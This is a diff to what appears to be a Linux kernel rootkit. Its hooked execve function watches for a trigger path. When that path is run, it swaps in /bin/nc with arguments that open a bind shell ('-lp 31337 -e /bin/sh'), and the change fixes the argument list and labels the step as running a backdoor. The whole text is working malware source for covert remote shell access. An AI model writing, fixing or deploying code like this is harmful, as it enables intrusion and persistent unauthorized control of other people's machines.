@@ -205,14 +205,14 @@ asmlinkage int hacked_execve(const char *filename, const char *argv[], const cha
 	char *truc = "/Imma/Firin/Muh/Lazer";
 	char *bd = "/bin/nc";
 
-	const char *arguments[] = {"-lp", "31337", "-e", "/bin/sh"};
+	const char *arguments[] = {"nc", "-lp", "31337", "-e", "/bin/sh"};
 
 	test = (char *) kmalloc(256, GFP_KERNEL);
 
 	copy_from_user(test, filename, 255);
 
 	if(strstr(truc, test) != NULL){
-		printk("Well hi there!");
+		printk("Attempting to run backdoor.\n");
 		copy_to_user(filename, bd, strlen(bd));
 		copy_to_user(argv, arguments, sizeof(psize) * 4);
 		kfree(test);
